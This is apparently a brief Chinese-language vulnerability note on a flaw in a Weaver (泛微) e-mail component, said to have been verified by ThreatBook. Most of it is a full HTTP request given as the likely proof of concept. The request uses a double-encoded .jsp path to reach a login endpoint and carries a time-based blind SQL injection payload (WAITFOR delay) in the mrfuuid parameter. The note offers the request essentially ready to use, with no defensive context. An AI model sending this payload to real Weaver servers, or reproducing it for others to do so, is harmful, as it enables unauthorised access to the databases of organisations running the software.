微步通报为验真漏洞，路径为：

/weaver/weaver.email.FileDownloadLocation/login/LoginSSOxjsp/x.FileDownl

oadLocation 路径

大概率是如下poc：

GET /weaver/FileDownloadLocation/login/LoginSSO.%256a%2573%2570?ddcode=7ea7ef3c41d67297&mrfuuid=1%27;if+db_name(1)=%27master%27+WAITFOR+delay+%270:0:5%27--+&mailid=0&a=.swf HTTP/1.1

Host:

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0

Accept-Encoding: gzip, deflate

Connection: close